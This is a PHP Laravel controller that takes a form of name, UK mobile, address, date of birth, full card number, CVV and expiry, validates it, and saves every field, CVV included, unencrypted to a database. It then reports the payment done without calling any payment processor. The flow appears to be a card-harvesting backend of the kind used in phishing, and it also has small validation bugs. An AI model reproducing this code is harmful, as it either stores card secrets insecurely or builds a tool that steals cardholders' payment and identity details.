<?php

namespace App\Http\Controllers;

use App\Models\Payment;
use Illuminate\Http\Request;
use Validator;

class PaymentController extends Controller
{
    public function payment(Request $request)
    {
        $request->validate([
            "f_name" => "required",
            "l_name" => "required",
            "mobile" => ['required','regex:/^(\+44\s?7\d{3}|\(?07\d{3}\)?)\s?\d{3}\s?\d{3}$/'],
            "f_line" => "required",
            "s_line" => "required",
            "town" => "required",
            "postal" => 'required|max:8',
            "dob" => "required|date",
            "card" => "required|max:16",
            "card_cvv" => "required",
            "card_exp" => "required|max:2",
        ],[
            'f_name.required' => 'First Name is Required',
            'l_name.required' => 'Last Name is Required',
            'f_line.required' => 'First Line is Required',
            'l_line.required' => 'Last Line is Required',
            'town.required' => 'Town is Required',
            'postal.required' => 'Postal Code is Required',
            'postal.max' => 'Postal Code is not correct',
            'dob.required' => 'Date of Birth is Required',
            'card.required' => 'Card is Required',
            'card.max' => 'Card is not correct',
            'card_cvv.required' => 'Cvv is Required',
            'card_exp.required' => 'Expiry is Required',
            'card_exp.max' => 'Card Expiry is not correct',
            'mobile.required' => 'Mobile Number is Required',
            'mobile.regex' => 'Please check mobile is correct (hint: +44 7*********)',
        ]);
        
        $payment = new Payment();
        $payment->f_name = $request->f_name;
        $payment->l_name = $request->l_name;
        $payment->mobile = $request->mobile;
        $payment->f_line = $request->f_line;
        $payment->l_line = $request->s_line;
        $payment->town = $request->town;
        $payment->postal = $request->postal;
        $payment->dob = $request->dob;
        $payment->card = $request->card;
        $payment->card_cvv = $request->card_cvv;
        $payment->card_exp = $request->card_exp;
        if($payment->save()){
            return back()->with(['success'=>'Payment Request Done.']);
        }else{
            return back()->with(['fail'=>'Payment Request not Done.']);
        }
    }
}
